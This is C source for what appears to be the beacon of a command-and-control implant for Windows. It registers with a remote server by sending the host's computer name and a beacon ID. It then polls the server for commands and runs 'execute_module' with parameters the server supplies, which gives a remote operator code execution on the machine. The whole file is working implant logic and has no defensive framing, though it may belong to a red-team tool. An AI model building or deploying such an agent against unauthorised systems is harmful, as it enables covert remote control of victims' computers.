#include <windows.h>
#include "helpers.h"

//----------------[registration]--------------------------------------------//

void register_base() {
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    GetComputerNameA(computerName, &size);

    char* registerData = (char*)malloc(512);
    snprintf(registerData, 512, "register|%s|%s", g_beaconId, computerName);

    printf("DEBUG: Sending registration: %s\n", registerData);

    char* registerResponse = httpSendToServer(registerData);
    if (registerResponse != NULL) {
        printf("registration response: %s\n", registerResponse);
        free(registerResponse);
    } else {
        printf("ERROR: No registration response received\n");
    }

    free(registerData);
}

//----------------[polling]-------------------------------------------------//

void request_action() {
    char* requestData = (char*)malloc(256);
    snprintf(requestData, 256, "request_action|%s", g_beaconId);

    char* url = buildHttpUrl(g_serverUrl, NULL);
    MyHttpResponse* response = makeHttpRequest(url, requestData, "POST", "Content-Type: text/plain");

    if (response != NULL && response->data != NULL) {
        if (strcmp(response->data, "no_pending_commands") != 0) {
            // Truncate output for large commands to avoid buffer overflow
            size_t cmdLen = strlen(response->data);
            if (cmdLen > 100) {
                printf("received command: %.100s... [%zu bytes total]\n", response->data, cmdLen);
            } else {
                printf("received command: %s\n", response->data);
            }

            char* commandCopy = _strdup(response->data);
            char* command = strtok(commandCopy, "|");
            if (command != NULL) {
                char* params = commandCopy + strlen(command) + 1;
                
                printf("Dispatching command: %s\n", command);
                
                if (strcmp(command, "shutdown") == 0) {
                    shutdown_base();
                } else if (strcmp(command, "execute_module") == 0) {
                    char* moduleParamsCopy = _strdup(params);
                    char* module = strtok(moduleParamsCopy, "|");
                    char* moduleParams = strtok(NULL, "");

                    // Truncate params output for large payloads to avoid buffer overflow
                    if (moduleParams != NULL) {
                        size_t paramsLen = strlen(moduleParams);
                        if (paramsLen > 100) {
                            printf("Executing module: %s with params: %.100s... [%zu bytes total]\n",
                                module ? module : "NULL", moduleParams, paramsLen);
                        } else {
                            printf("Executing module: %s with params: %s\n",
                                module ? module : "NULL", moduleParams);
                        }
                    } else {
                        printf("Executing module: %s with params: NULL\n",
                            module ? module : "NULL");
                    }

                    execute_module(module, moduleParams);
                    free(moduleParamsCopy);
                } else if (strcmp(command, "checkin") == 0) {
                    checkin();
                } else {
                    printf("Unknown command: %s\n", command);
                }
            }
            free(commandCopy);
        }

        freeHttpResponse(response);
    }

    free(requestData);
    free(url);
}

//----------------[checkin]-------------------------------------------------//

void checkin() {
    char* checkinData = (char*)malloc(256);
    snprintf(checkinData, 256, "checkin|%s", g_beaconId);

    char* checkinResponse = httpSendToServer(checkinData);
    if (checkinResponse != NULL) {
        printf("checkin response: %s\n", checkinResponse);
        free(checkinResponse);
    }

    free(checkinData);
}